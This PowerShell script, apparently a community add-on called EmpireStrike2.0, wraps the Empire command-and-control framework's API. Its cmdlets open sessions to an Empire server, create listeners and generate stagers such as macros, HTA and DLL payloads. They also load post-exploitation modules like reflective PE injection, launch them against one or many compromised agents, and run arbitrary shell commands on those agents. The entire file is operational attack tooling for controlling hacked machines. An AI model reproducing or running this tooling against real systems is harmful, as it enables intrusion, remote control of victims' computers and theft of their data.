######################################################################################## INFO
<#
Tool     : EmpireStrike2.0
Desc     : Empire API Extra Cmdlets (PowerEmpire Add-On)
Author   : SadProcessor
Version  : 2.0
Required : Empire 2.0
Required : PowerEmpire2.0_DogMod

#>

#############################################################################################
################################################################################### FUNCTIONS
#############################################################################################

####################################################################################### Setup

<#
.Synopsis
   Setup Session
.DESCRIPTION
   Setup Empire Session
   Interactive: Asks for Host/Username/Password
.EXAMPLE
   Setup
   Setup new session to Empire Host  
.EXAMPLE
   Setup -NoSession
   Run Setup without creating session 
   (Repair EmpireStrike Objects if broken)
.OUTPUTS
   Connection message
.NOTES
   Auto runs when first time loading EmpireStrike module
.COMPONENT
   Belongs to EmpireStrike.ps1
.FUNCTIONALITY
   Setup new session to Empire Host
#>
function Invoke-EmpireSetup{
    [CmdletBinding(DefaultParameterSetName='NewSession')]
    [Alias('Setup','Connect')]
    Param(
        # Skip Session Creation
        [Parameter(Mandatory=$true,ParameterSetName='NoSession')][Switch]$NoSession
        )
    Begin{
        # Setup: Prereq = PowerEmpire by DarkOperator
        if(!$(get-command -Module PowerEmpire2.0_DogMod)){try{Import-Module PowerEmpire2.0_DogMod -Force}catch{'Warning - PowerEmpire2.0_DogMod not found'}}
        }
    Process{
        if($PSCmdlet.ParameterSetName -eq 'NewSession'){
            # Setup: New Session Command
            $Server = Read-Host 'Empire Host'
            $User   = Read-Host 'Empire User'
            # Connect to session
            try{$Null = New-EmpireSession -NoSSLCheck -Credential $User -ComputerName $Server}catch{}
            if($Global:EmpireSessions){Write-Host ">> Connected to $Server"}
            else{"Computer Says Nooo...";Break}
            }
        # Default Target Object
        if(!$Global:EmpireTarget){$Global:EmpireTarget= New-Object PSCustomObject -Property @{'Session'=0;'Agent'='?'}}
        # Init Strike Objects
        if(!$Global:StrikeModule){$Global:StrikeModule = 'NoModule'}
        if(!$Global:StrikeOtions){$Global:StrikeOptions = 'NoModule'} 
        # Setup: Initial Sync
        if(!$Global:EmpireModules){Sync}      
        }
    End{}
    }

######################################################################################## Sync

<#
.Synopsis
   Synchronize EmpireStrike Objects
.DESCRIPTION
   (Re)-Synchronize EmpireStrike Objects
.EXAMPLE
   Sync
   Sync all lists of current session
.EXAMPLE
   Sync Agents
   Sync only agent list
.OUTPUTS
   No output if success
.NOTES
   Auto sync on session switch
.COMPONENT
   Belongs to EmpireStrike.ps1
.FUNCTIONALITY
   Synchronize EmpireStrike Objects
#>
function Invoke-EmpireSync{
    [CmdletBinding(DefaultParameterSetName='NoParam')]
    [Alias('Sync','Refresh')]
    Param(
        #Object to sync
        [ValidateSet('Session','Agents','Modules','Listeners')]
        [Parameter(Position=0,Mandatory=$false)]$Object='Session'
        )
    Begin{}
    Process{
        Switch($Object){
            'Agents' {$Global:EmpireAgents = Get-EmpireAgent -Id $Global:EmpireTarget.Session}
            'Modules'{$Global:EmpireModules = Get-EmpireModule -Id $Global:EmpireTarget.Session}
            'Listeners'{$Global:EmpireListeners = Get-EmpireListener -Id $Global:EmpireTarget.Session}
            'Session'{Sync Agents;Sync Modules;Sync Listeners}
            }
        }
    End{}
    }

##################################################################################### Session

<#
.Synopsis
   Get|Set Empire Sessions 
.DESCRIPTION
   Check/Select Empire Session
.EXAMPLE
   Session ?
   Check Current selected session
.EXAMPLE
   Session *
   Check all sessions
.EXAMPLE
   Session 0
   Set current session to Session 0
.INPUTS
   None 
.OUTPUTS
   No output on Select
.NOTES
   Switching to another session will sync EmpireStrike Objects
.COMPONENT
   Belongs to EmpireStrike.ps1
.FUNCTIONALITY
   Switch between Sessions / Check sessions
#>
function Invoke-EmpireSession{
    [CmdletBinding()]
    [Alias('Session','ID')]
    Param()
    DynamicParam{
        $Values = @()
        $Values += '*','?'
        $Values += $Global:EmpireSessions.id
        # Create Attribute Object
        $Attrib = New-Object System.Management.Automation.ParameterAttribute
        $Attrib.Mandatory = $true
        $Attrib.Position = 0
        # Create AttributeCollection object for the attribute Object
        $Collection = new-object System.Collections.ObjectModel.Collection[System.Attribute]
        # Add our custom attribute to collection
        $Collection.Add($Attrib)
        # Add Validate Set to attribute collection  
        $ValidateSet=new-object System.Management.Automation.ValidateSetAttribute($Values)
        $Collection.Add($ValidateSet)
        # Create Runtime Parameter with matching attribute collection
        $DynParam = New-Object System.Management.Automation.RuntimeDefinedParameter('ID',[String],$Collection)        
        # Create runtime Dictionary for this ParameterSet
        $Dictionary = New-Object System.Management.Automation.RuntimeDefinedParameterDictionary
        # Add all Runtime Params to dictionary
        $Dictionary.Add('ID',$dynParam)
        return $Dictionary
        }
    Begin{$Output=$Null}
    Process{
        $Input = $DynParam.Value
        Switch($Input){
            '*'{$Output=$Global:EmpireSessions | select ID,Host }
            '?'{$Output=$Global:EmpireTarget}
            default{$Global:EmpireTarget.Session=$Input;Sync Session}
            }
        }
    End{$Output}
    }

##################################################################@################# Listener

<#
.Synopsis
   Get|Set Empire Listeners 
.DESCRIPTION
   Check Empire Listeners / Set Target object
.EXAMPLE
   Listener -view *
   Check all Listeners in current session
.EXAMPLE
   Listener -view ThisListener
   View specific listener in current session
.INPUTS
   Listener name to check
   or 
   Type and name (options) Listener to create
.OUTPUTS
   No output on Select
.NOTES
   Only in current session
.COMPONENT
   Belongs to EmpireStrike.ps1
.FUNCTIONALITY
   Switch between Agents / Check Agents
#>
function Invoke-EmpireListener{
    [CmdletBinding()]
    [Alias('Listener')]
    Param(
        [Parameter(Mandatory=$true,ParameterSetName='ViewName')]
        [Parameter(Mandatory=$true,ParameterSetName='ViewOption')][Switch]$View,
        
        [Parameter(Mandatory=$true,ParameterSetName='NewListener')][Switch]$New,

        [ValidateSet('dbx','http','http_com','http_foreign','http_hop','http_mapi','meterpreter')]
        [Parameter(Mandatory=$true,ParameterSetname='ViewOption')]
        [Parameter(Mandatory=$true,ParameterSetname='NewListener')][String]$Type,
        [Parameter(Mandatory=$true,Position=0,ParameterSetname='NewListener')][String]$GivenName
        )
    DynamicParam{
        # Create runtime Dictionary for this ParameterSet
        $Dictionary = New-Object System.Management.Automation.RuntimeDefinedParameterDictionary
        if($PSCmdlet.ParameterSetname -eq 'ViewName'){
            $Values = @()
            $Values += '*'
            $Values += $Global:EmpireListeners.Name
            # Create Attribute Object
            $Attrib = New-Object System.Management.Automation.ParameterAttribute
            $Attrib.Mandatory = $true
            $Attrib.Position = 0
            # Create AttributeCollection object for the attribute Object
            $Collection = new-object System.Collections.ObjectModel.Collection[System.Attribute]
            # Add our custom attribute to collection
            $Collection.Add($Attrib)
            # Add Validate Set to attribute collection 
            $ValidateSet=new-object System.Management.Automation.ValidateSetAttribute($Values)
            $Collection.Add($ValidateSet)
            # Create Runtime Parameter with matching attribute collection
            $DynParam = New-Object System.Management.Automation.RuntimeDefinedParameter('Name',[String],$Collection)
            # Add Runtime Params to dictionary
            $Dictionary.Add('Name',$dynParam)
            }
         if($PSCmdlet.ParameterSetname -eq 'NewListener'){   
            # Create Attribute Object
            $Attrib1 = New-Object System.Management.Automation.ParameterAttribute
            $Attrib1.Mandatory = $false
            # Create AttributeCollection object for the attribute Object
            $Collection1 = new-object System.Collections.ObjectModel.Collection[System.Attribute]
            # Add our custom attribute to collection
            $Collection1.Add($Attrib1)
            # Create Runtime Parameter with matching attribute collection
            $DynParam1 = New-Object System.Management.Automation.RuntimeDefinedParameter('Options',[HashTable],$Collection1)
            # Add Runtime Params to dictionary
            $Dictionary.Add('Options',$dynParam1)
            }
        if($PSCmdlet.ParameterSetname -eq 'ViewOption'){
            # Create Attribute Object
            $Attrib1 = New-Object System.Management.Automation.ParameterAttribute
            $Attrib1.Mandatory = $false
            # Create AttributeCollection object for the attribute Object
            $Collection1 = new-object System.Collections.ObjectModel.Collection[System.Attribute]
            # Add our custom attribute to collection
            $Collection1.Add($Attrib1)
            # Create Runtime Parameter with matching attribute collection
            $DynParam1 = New-Object System.Management.Automation.RuntimeDefinedParameter('Clip',[Switch],$Collection1)
            
            # Add Runtime Params to dictionary
            $Dictionary.Add('Clip',$dynParam1)
            }
        # return Dictionary
        return $Dictionary
        }
    Begin{$Output=$Null}
    Process{
        if($PSCmdlet.ParameterSetName -eq 'viewName'){
            if($DynParam.Value -eq '*'){$Output=$Global:EmpireListeners.Name}
            else{
                $Output=Get-EmpireListener -Id $Global:EmpireTarget.Session -Name $DynParam.Value
                }
            }
        if($PSCmdlet.ParameterSetName -eq 'viewOption'){
            $Output = (Get-EmpireListenerOption -Id $Global:EmpireTarget.Session -Type $Type)
            if($DynParam1.IsSet){
                $StringClip = "@{"
                foreach($Option in $Output | ? Name -ne name){$StringClip += "'$($Option.Name)'='$($Option.Value)';"}
                $StringClip = $StringClip.trimEnd(';') + '}'
                $StringClip = $StringClip -replace "'Port'","'ListenerPort'" -replace "'Host'","'ListenerHost'"
                $StringClip | Set-clipboard
                }
            } 
        if($PSCmdlet.ParameterSetName -eq 'NewListener'){
            if($DynParam1.IsSet){
                [hashtable]$Options = $dynParam1.Value
                $Output = New-EmpireListener -Id $Global:EmpireTarget.session -Name $GivenName -Type $Type @Options
                }
            Else{$Output = New-EmpireListener -Id $Global:EmpireTarget.session -Name $GivenName -Type $Type}
            #Sync Listeners
            sync Listeners
            }   
        }
    End{Return $Output}
    }

####################################################################################### Agent

<#
.Synopsis
   Get|Set Empire Agents
.DESCRIPTION
   Check/Select Default Empire Agent
.EXAMPLE
   Agent .
   Check current default Agent Name
.EXAMPLE
   Agent ?
   Check current default Agent
.EXAMPLE
   Agent ??
   Check current default Agent details
.EXAMPLE
   Agent *
   List all agents in current session
.EXAMPLE
   Agent QWERTYU
   Set QWERTYU as default target agent
.INPUTS
   None
.OUTPUTS
   No output on Select
.NOTES
   Can only select agents in current session
.COMPONENT
   Belongs to EmpireStrike.ps1
.FUNCTIONALITY
   Switch between Agents / Check Agents
#>
function Invoke-EmpireAgent{
    [CmdletBinding()]
    [Alias('Agent','Target')]
    Param()
    DynamicParam{
        $Values = @()
        $Values += '*','?','??','.'
        $Values += $Global:EmpireAgents.Name
        # Create Attribute Object
        $Attrib = New-Object System.Management.Automation.ParameterAttribute
        $Attrib.Mandatory = $true
        $Attrib.Position = 0
        # Create AttributeCollection object for the attribute Object
        $Collection = new-object System.Collections.ObjectModel.Collection[System.Attribute]
        # Add our custom attribute to collection
        $Collection.Add($Attrib)
        # Add Validate Set to attribute collection 
        $ValidateSet=new-object System.Management.Automation.ValidateSetAttribute($Values)
        $Collection.Add($ValidateSet)
        # Create Runtime Parameter with matching attribute collection
        $DynParam = New-Object System.Management.Automation.RuntimeDefinedParameter('Name',[String],$Collection)
            
        # Create runtime Dictionary for this ParameterSet
        $Dictionary = New-Object System.Management.Automation.RuntimeDefinedParameterDictionary
        # Add all Runtime Params to dictionary
        $Dictionary.Add('Name',$dynParam)
        return $Dictionary
        }
    Begin{$Output=$Null}
    Process{
        $Input = $DynParam.Value
        Switch($Input){
            '*'{$Output=$Global:EmpireAgents.Name}
            '.'{$Output=$Global:EmpireTarget.Agent}
            '?'{$Output=$Global:EmpireTarget}
            '??'{$Output=$Global:EmpireAgents | ? name -eq $Global:EmpireTarget.Agent | select * -ExcludeProperty results}
            default{$Global:EmpireTarget.Agent=$Input}
            }
        }
    End{Return $Output}
    }

###################################################################################### Stager

<#
.Synopsis
   Get|Set Empire Stager 
.DESCRIPTION
   Quickly generate Stager for Specified Listener in current session
.EXAMPLE
   stager multi/launcher -Listener Listener1
   Generate multi/launcher type stager for listener Listener1 
.EXAMPLE
   stager multi/launcher -Listener Listener1 -ToClip
   Output directrly to clipboard
.INPUTS
   None 
.OUTPUTS
   None if -ToClip
.NOTES
   Use Powerempire Command if otions needed other than default
.COMPONENT
   Belongs to EmpireStrike.ps1
.FUNCTIONALITY
   Generate stagers
#>
function Invoke-EmpireStager{
    [CmdletBinding()]
    [Alias('Stager')]
    Param(
        #Type
        [ValidateSet('multi/bash','multi/launcher','multi/pyinstaller','multi/war','osx/applescript','osx/application','osx/ducky','osx/dylib','osx/jar','osx/launcher','osx/macho','osx/macro','osx/pkg','osx/safari_launcher','osx/teensy','windows/bunny','windows/dll','windows/ducky','windows/hta','windows/launcher_bat','windows/launcher_sct','windows/launcher_vbs','windows/macro','windows/teensy')]
        [Parameter(Position=0,Mandatory=$false)][String]$Type='multi/launcher',
        #ToClip
        [Parameter(Mandatory=$false)][Switch]$ToClip
        )
    DynamicParam{
        $Values = $Listeners = (Get-EmpireListener -Id $EmpireTarget.Session).Name
        # Create Attribute Object
        $Attrib = New-Object System.Management.Automation.ParameterAttribute
        $Attrib.Mandatory = $true
        $Attrib.Position = 1
        # Create AttributeCollection object for the attribute Object
        $Collection = new-object System.Collections.ObjectModel.Collection[System.Attribute]
        # Add our custom attribute to collection
        $Collection.Add($Attrib)
        # Add Validate Set to attribute collection 
        $ValidateSet=new-object System.Management.Automation.ValidateSetAttribute($Values)
        $Collection.Add($ValidateSet)
        # Create Runtime Parameter with matching attribute collection
        $DynParam = New-Object System.Management.Automation.RuntimeDefinedParameter('Listener',[String],$Collection)
            
        # Create runtime Dictionary for this ParameterSet
        $Dictionary = New-Object System.Management.Automation.RuntimeDefinedParameterDictionary
        # Add all Runtime Params to dictionary
        $Dictionary.Add('Listener',$dynParam)
        return $Dictionary
        }
    Begin{
    $Listener = $dynParam.Value
    }
    Process{
        $Result = (New-EmpireStager -Id $EmpireTarget.Session -ListenerName $Listener -StagerType $type)
        if($ToClip){$Result.output | Set-Clipboard; $Result = $null}
        }
    End{Return $Result}
    }

###################################################################################### Search

<#
.Synopsis
   Search Empire modules
.DESCRIPTION
   Seacrh Empire Module by keyword and optional field
.EXAMPLE
   ModuleSearch password
   Search for keyword password
   (searches in Name and Description)
.EXAMPLE
   ModuleSearch Sadprocessor -Category Author
   Specify category to search
.EXAMPLE
   ModuleSearch LSASS -Select Name,Description,Author
   Specify categories to return
.INPUTS
   None
.OUTPUTS
   Returns found items
.NOTES
   Accpets -category * and -select *  
.COMPONENT
   Belongs to EmpireStrike.ps1
.FUNCTIONALITY
   Search Empire Modules
#>
function Invoke-EmpireModuleSearch{
    [Alias('ModuleSearch','FindModule')]
    Param(
        # Term(s) to search 
        [Parameter(Position=0,Mandatory=$true)][Alias('Item')][String[]]$Match,
        # Field(s) to search
        [ValidateSet('Author','Background','Comments','Description','MinPSVersion','Name','NeedsAdmin','OpsecSafe','options','OutputExtension','*')]
        [Parameter(Position=1,Mandatory=$false)][Alias('Where')][String[]]$Category = @('Name','Description'),
        # Field(s) to return
        [ValidateSet('Author','Background','Comments','Description','MinPSVersion','Name','NeedsAdmin','OpsecSafe','options','OutputExtension','*')]
        [Parameter(Mandatory=$false)][Alias('Show')][String[]]$Select = @('Name','Description','Comments'),
        # Language Module Name Filter
        [ValidateSet('PowerShell','Python','OSX','Linux','Multi')]
        [Parameter(Mandatory=$false)][String]$Lang
        )
    Begin{
        if($match -eq '*'){$match=$lang}
        $Output=@()
        if($Category -eq '*'){$Category = @('Author','Background','Comments','Description','MinPSVersion','Name','NeedsAdmin','OpsecSafe','options','OutputExtension')}
        if($Select -eq '*'){$Select = @('Author','Background','Comments','Description','MinPSVersion','Name','NeedsAdmin','OpsecSafe','options','OutputExtension')}
        }
    Process{
        Foreach($Key in $Match){
            foreach($Cat in $Category){
                try{$Output += $Global:EmpireModules | where $Cat -match $Key}catch{}
                }
            }
        if($Lang){$Output=$Output|? Name -match "$Lang/"}
        }
    End{$Output | sort Name -unique | Select $Select}
    }

###################################################################################### Module

<#
.Synopsis
   Get|Set Empire Modules 
.DESCRIPTION
   Check/Set Empire Module
.EXAMPLE
   Module ?
   Check current loaded module
.EXAMPLE
   Module *
   Returns a list of all modules
.EXAMPLE
   module powershell/code_execution/invoke_reflectivepeinjection
   Load specified module
.INPUTS
   None
.OUTPUTS
   No output on Select
.NOTES
   Auto-completion on module name
.COMPONENT
   Belongs to EmpireStrike.ps1
.FUNCTIONALITY
   Load/Check Module
#>
function Invoke-EmpireModule{
    [CmdletBinding()]
    [Alias('Module','Load')]
    Param()
    DynamicParam{
        $Values = $Global:EmpireModules.Name
        $Values += '*','?'
        # Create Attribute Object
        $Attrib = New-Object System.Management.Automation.ParameterAttribute
        $Attrib.Mandatory = $true
        $Attrib.Position = 0
        # Create AttributeCollection object for the attribute Object
        $Collection = new-object System.Collections.ObjectModel.Collection[System.Attribute]
        # Add our custom attribute to collection
        $Collection.Add($Attrib)
        # Add Validate Set to attribute collection 
        $ValidateSet=new-object System.Management.Automation.ValidateSetAttribute($Values)
        $Collection.Add($ValidateSet)
        # Create Runtime Parameter with matching attribute collection
        $DynParam = New-Object System.Management.Automation.RuntimeDefinedParameter('Name',[String],$Collection)
            
        # Create runtime Dictionary for this ParameterSet
        $Dictionary = New-Object System.Management.Automation.RuntimeDefinedParameterDictionary
        # Add all Runtime Params to dictionary
        $Dictionary.Add('Name',$dynParam)
        return $Dictionary
        }
    Begin{$Output=$Null}
    Process{
        $Input = $DynParam.Value
        Switch($Input){
            '*'{$Output=$Global:EmpireModules | select Name,Description | sort name}
            '?'{$Output=$Global:StrikeModule}
            default{
                $Global:StrikeModule = $Global:EmpireModules | where Name -eq $Input
                $OptList = ($Global:StrikeModule.options | gm | ? -Property MemberType -EQ NoteProperty).Name
                $OptCollection = @()
                foreach($Opt in $OptList){
                    $Props = @{
                        'Option'=$Opt
                        'Description'=$Global:StrikeModule.Options.$Opt.Description
                        'Mandatory'=$Global:StrikeModule.Options.$Opt.Required
                        'Value'=$Global:StrikeModule.Options.$Opt.Value
                        }
                    If($Props.Value -eq '' -AND $Props.Mandatory -eq $true){$props.Value='?'}
                    $OptCollection += New-Object PSCustomObject -Property $Props
                    }
                $Global:StrikeOptions = $OptCollection | select Option,Description,Mandatory,Value
                }
            }
        }
    End{Return $Output}
    }

###################################################################################### Option

<#
.Synopsis
   Get|Set Empire Module Options 
.DESCRIPTION
   Check/Set Empire Module options
.EXAMPLE
   Option ?
   Options for currently loaded module
.EXAMPLE
   Option *
   Returns options with description
.EXAMPLE
   Option ProcId 1234
   Set specified option to specified value
.INPUTS
   None
.OUTPUTS
   No output on Set
   Use 'Option ?' to check
.NOTES
   Setting agent is not needed.
   Target agent will be used.
   You can leave it on ?
.COMPONENT
   Belongs to EmpireStrike.ps1
.FUNCTIONALITY
   Set/Check Module options
#>
function Invoke-EmpireOption{
    [CmdletBinding()]
    [Alias('Option','Set','ModuleOption')]
    Param()
    DynamicParam{
        # Prep DynSet
        $Values = '*','?'
        $Values += $Global:StrikeOptions.Option
        # Create Attribute Object
        $Attrib = New-Object System.Management.Automation.ParameterAttribute
        $Attrib.Mandatory = $true
        $Attrib.Position = 0
        # Create AttributeCollection object for the attribute Object
        $Collection = new-object System.Collections.ObjectModel.Collection[System.Attribute]
        # Add our custom attribute to collection
        $Collection.Add($Attrib)
        # Add Validate Set to attribute collection 
        $ValidateSet=new-object System.Management.Automation.ValidateSetAttribute($Values)
        $Collection.Add($ValidateSet)
        # Create Runtime Parameter with matching attribute collection
        $DynParam = New-Object System.Management.Automation.RuntimeDefinedParameter('Option',[String],$Collection)

        # Create Attribute Object
        $Attrib2 = New-Object System.Management.Automation.ParameterAttribute
        $Attrib2.Mandatory = $false
        $Attrib2.Position = 1
        # Create AttributeCollection object for the attribute Object
        $Collection2 = new-object System.Collections.ObjectModel.Collection[System.Attribute]
        # Add our custom attribute to collection
        $Collection2.Add($Attrib2)
        # Create Runtime Parameter with matching attribute collection
        $DynParam2 = New-Object System.Management.Automation.RuntimeDefinedParameter('Value',[String],$Collection2)
            
        # Create runtime Dictionary for this ParameterSet
        $Dictionary = New-Object System.Management.Automation.RuntimeDefinedParameterDictionary
        # Add all Runtime Params to dictionary
        $Dictionary.Add('Option',$dynParam)
        $Dictionary.Add('Value',$dynParam2)
        return $Dictionary
        }
    Begin{$Output=$Null}
    Process{
        $Option = $DynParam.Value
        $Value = $DynParam2.Value
        Switch($Option){
            '*'{$Output=$Global:StrikeOptions}
            '?'{$Output=$Global:StrikeOptions | select Option,Mandatory,Value}
            default{($Global:StrikeOptions|? Option -eq $Option).Value=$Value}
            }
        }
    End{Return $Output}
    }

######################################################################################## View

<#
.Synopsis
   View EmpireStrike Objects
.DESCRIPTION
   View EmpireStrike Objects
.EXAMPLE
   View Module
   View module object
.EXAMPLE
   View Strike
   View Strike object Details 
.INPUTS
   None 
.OUTPUTS
   Requestable Objects:
   Session|Agent|Module|Option|Strike|Code|Info
.COMPONENT
   Belongs to EmpireStrike.ps1
.FUNCTIONALITY
   View EmpireStrike Objects
#>
function Invoke-EmpireView{
    [Alias('View','Show')]
    Param(
        #Object to view
        [ValidateSet('Session','Agent','Module','Options','Strike','Info','Code')]
        [Parameter(Position=0,Mandatory=$false)][String]$Object='Strike'
        )
    #PREP
    Begin{
        #if No Module >> show Strike obj & Break
        If((!$Global:StrikeModule.name) -AND ($Object -match "Module|Options|Strike|Info")){$Global:StrikeModule;Break}
        #Get module folder
        try{$Mod = $Global:StrikeModule.Name.split('/')[0]}catch{}
        #Prep code url
        $Code = "https://github.com/EmpireProject/Empire/tree/master/data/module_source/$Mod"
        #Prep Info url
        $Info = $Global:StrikeModule.Comments -match 'http'
        # Select url
        Switch($Object){
            'Info'{$Selection=$Info}
            'Code'{$Selection=$Code}
            }
        }
    #ACTION
    Process{
        #Prep Output
        Switch($Object){
            'Session'{$Output=$Global:EmpireSessions}
            'Agent'{$Output=$Global:EmpireTarget}
            'Module'{$Output=$Global:StrikeModule}
            'Options'{$Output=$Global:StrikeOptions}
            'Strike'{$Output=Strike ?}
            #or open selected url
            Default{Foreach($URL in $Selection){start $URL;$Output=$Null}}
            }
        }
    #OUTPUT
    End{$Output}
    }

###################################################################################### Strike

<#
.Synopsis
   Launch Strike
.DESCRIPTION
   Execute Selected Module with Selected Options on specified/Default Target
.EXAMPLE
   Strike
   Strike default agent with loaded module and specified options
.EXAMPLE
   Strike QWERTYU
   Strike specified agent
.EXAMPLE
   Strike QWERTYU -Blind
   Strike without waiting for result
.INPUTS
   None 
.OUTPUTS
   Strike result (unless -blind)
.NOTES
   Use Invoke-EmpireResult to recover results from blind strike
   Use StrikeX to strike multiple agents
.COMPONENT
   Belongs to EmpireStrike.ps1
.FUNCTIONALITY
   Arrooooo!
#>
function Invoke-EmpireStrike{
    [CmdletBinding(DefaultParameterSetName='Strike')]
    [Alias('Strike','Arrooooo!')]
    Param(
        [Parameter(Mandatory=$False)][Switch]$Blind
        )
    DynamicParam{
        $Values = @()
        $Values += '?'
        $Values += $Global:EmpireAgents.name
        # Create Attribute Object
        $Attrib = New-Object System.Management.Automation.ParameterAttribute
        $Attrib.Mandatory = $false
        $Attrib.Position = 0
        # Create AttributeCollection object for the attribute Object
        $Collection = new-object System.Collections.ObjectModel.Collection[System.Attribute]
        # Add our custom attribute to collection
        $Collection.Add($Attrib)
        # Add Validate Set to attribute collection  
        $ValidateSet=new-object System.Management.Automation.ValidateSetAttribute($Values)
        $Collection.Add($ValidateSet)
        # Create Runtime Parameter with matching attribute collection
        $DynParam = New-Object System.Management.Automation.RuntimeDefinedParameter('Agent',[String],$Collection)        
        # Create runtime Dictionary for this ParameterSet
        $Dictionary = New-Object System.Management.Automation.RuntimeDefinedParameterDictionary
        # Add all Runtime Params to dictionary
        $Dictionary.Add('Agent',$dynParam)
        return $Dictionary
        }
    Begin{
        $Agent = $dynParam.Value
        if($Agent -eq $Null){$Agent = $Global:EmpireTarget.Agent}
        $ID = $Global:EmpireTarget.Session
        # If No Module >> Break
        if($Global:StrikeModule -eq 'NoModule'){$Global:StrikeModule;Break}
        # Prep Empty Poutput
        $Output=@()
        #Prep option KV pairs
        $KV_Option = $Global:StrikeOptions | select Option,Value | ? Option -ne Agent | ? Value -ne ''
        try{$Props=@{
            'Session'='['+$Global:EmpireTarget.Session+']'
            'Agent'='['+$Global:EmpireTarget.Agent+']'
            'Module'=$Global:StrikeModule.Name
            'Description'=$Global:StrikeModule.Description
            }}catch{}
        # Prep basic Strike obj
        $StrikeObj = New-Object PSCustomObject -Property $props
        # Add Options to Strike obj
        foreach($KV in $KV_Option){
                try{$StrikeObj | Add-Member -MemberType NoteProperty -Name $KV.Option -Value $KV.Value -EA SilentlyContinue}catch{}
                }
        # If CheckList
        if($Agent -eq '?'){$result=$StrikeObj|select Session,Agent,Module,Description,* -EA SilentlyContinue}
        }
    Process{
        # If Strike
        if($Agent -ne '?'){
            $target = $Agent
            if(!$Blind){$OldCount=(Result -Agent $Target -Full).count}
            #Clear Agent Memory
            #$Null = Clear-EmpireAgentTaskResult -Id $ID -Name $Target
            # If options
            if($KV_Option.value){
                #Break if missing mandatory options
                if($KV_Option.Value -contains '?'){$KV_Option;break}
                #Format options
                $KV_HT = @{}
                $KV_Option  | %{$KV_HT.add($_.Option,$_.Value)}
                #Send Query
                $Null = Register-EmpireAgentModuleTask -Id $ID -Name $target -Module $Global:StrikeModule.name -Options $KV_HT}
            Else{$Null = Register-EmpireAgentModuleTask -Id $ID -Name $target -Module $Global:StrikeModule.name}
                
            #Get Results
            if($Blind){$Result=$Null}
            Else{
                #Wait for results
                $NewCount = (Result -Agent $Target -Full).count
                while($NewCount -eq $OldCount){
                    Start-Sleep -Seconds 1
                    $data = Result -Agent $Target -Full
                    $LastData = ($Data[$Data.count -1]).results 
                    #if($lastData -like "Job started*"){$OldCount += 1}
                    $NewCount = $data.count
                    }
                #Prep Result
                $result = $LastData
                }
            }
        }
    End{return $result}
    }

##################################################################################### StrikeX

<#
.Synopsis
   Launch Strike on Multiple Targets
.DESCRIPTION
   Execute Selected Module with Selected Options on specified/Default Target
.EXAMPLE
   StrikeX
   Strike multiple agents with loaded module and specified options
.EXAMPLE
   'QWERTYU','ASDFGHJ' | StrikeX
.INPUTS
   Targets 
.OUTPUTS
   No output. Use Invoke-EmpireResult
.NOTES
   Invoke-EmpireResult to recover results
.COMPONENT
   Belongs to EmpireStrike.ps1
.FUNCTIONALITY
   Aaaaaaaaayahh!
#>
Function Invoke-EmpireStrikeX{
    [CmdletBinding()]
    [Alias('StrikeX','Aaaaaaaaayahh')]
    Param()
    DynamicParam{
        $Values = @(Agent *)
        # Create Attribute Object
        $Attrib = New-Object System.Management.Automation.ParameterAttribute
        $Attrib.Mandatory = $false
        $Attrib.Position = 0
        $Attrib.ValueFromPipeline=$true
        # Create AttributeCollection object for the attribute Object
        $Collection = new-object System.Collections.ObjectModel.Collection[System.Attribute]
        # Add our custom attribute to collection
        $Collection.Add($Attrib)
        # Add Validate Set to attribute collection  
        $ValidateSet=new-object System.Management.Automation.ValidateSetAttribute($Values)
        $Collection.Add($ValidateSet)
        # Create Runtime Parameter with matching attribute collection
        $DynParam = New-Object System.Management.Automation.RuntimeDefinedParameter('Agent',[String[]],$Collection)        
        # Create runtime Dictionary for this ParameterSet
        $Dictionary = New-Object System.Management.Automation.RuntimeDefinedParameterDictionary
        # Add all Runtime Params to dictionary
        $Dictionary.Add('Agent',$dynParam)
        return $Dictionary       
        }
    Begin{}
    Process{
        foreach($Target in $dynParam.Value){
            Strike -Agent $Target -blind
            }
        }
    End{}
    }

##################################################################################### Command

<#
.Synopsis
   Run Commands on Agent
.DESCRIPTION
   Run PoSh Commands on Agents
.EXAMPLE
   Command Get-Date
   Command to default agent
.EXAMPLE
   Command 'Get-Date' QWERTYU
   Command to specific agent
.EXAMPLE
   Command 'Get-Date|select *' -Json
   try to recover objects
   (depends on command output)
.EXAMPLE
   Command 'Get-Date' -Blind
   Command without waiting for result
.INPUTS
   Command String  
.OUTPUTS
   Returns Command output unless -Blind
.NOTES
   Use * to target all agents in current session
   PS> Command Get-Date *
.COMPONENT
   Belongs to EmpireStrike.ps1
.FUNCTIONALITY
   Run PoSh Commands on Agents
#>
function Invoke-EmpireCommand{
    [CmdletBinding()]
    [Alias('Command')]
    Param(
        [Parameter(Mandatory=$True,Position=0)][String]$Command,
        [Parameter(Mandatory=$False)][Switch]$Blind,
        [Parameter(Mandatory=$False)][Switch]$Json
        )
    DynamicParam{
        $Values = @()
        $Values += $Global:EmpireAgents.name
        # Create Attribute Object
        $Attrib = New-Object System.Management.Automation.ParameterAttribute
        $Attrib.Mandatory = $false
        $Attrib.Position = 1
        # Create AttributeCollection object for the attribute Object
        $Collection = new-object System.Collections.ObjectModel.Collection[System.Attribute]
        # Add our custom attribute to collection
        $Collection.Add($Attrib)
        # Add Validate Set to attribute collection  
        $ValidateSet=new-object System.Management.Automation.ValidateSetAttribute($Values)
        $Collection.Add($ValidateSet)
        # Create Runtime Parameter with matching attribute collection
        $DynParam = New-Object System.Management.Automation.RuntimeDefinedParameter('Agent',[String],$Collection)        
        # Create runtime Dictionary for this ParameterSet
        $Dictionary = New-Object System.Management.Automation.RuntimeDefinedParameterDictionary
        # Add all Runtime Params to dictionary
        $Dictionary.Add('Agent',$dynParam)
        return $Dictionary
        }
    Begin{
        $Agent = $dynParam.Value
        if($Agent -eq $Null){$Agent = $Global:EmpireTarget.Agent}
        $ID = $Global:EmpireTarget.Session
        if($Json){$Command="$Command"+'|ConvertTo-Json'}
        }
    Process{
        # Prep
        $target = $Agent
        $Result = $Null
        # If not blind
        if(!$Blind){$OldCount=(Result -Agent $Target -Full).count}
        #Send Command
        $Null = Register-EmpireAgentShellCommandTask -Id $ID -Name $target -Command $Command
        #Get Results or not
        if($Blind){$Result=$Null}
        Else{
            #Wait for results
            $NewCount = (Result -Agent $Target -Full).count
            while($NewCount -eq $OldCount){
                Start-Sleep -Seconds 1
                $data = Result -Agent $Target -Full
                Try{$LastData = ($Data[$Data.count -1]).results}catch{} 
                if($lastData -like "Job started*"){$OldCount += 1}
                $NewCount = $data.count
                }
            #Prep Result
            $result = $LastData
            if($Json){$Result=$Result|Convertfrom-Json}
            }
        }
    End{return $Result}
    }

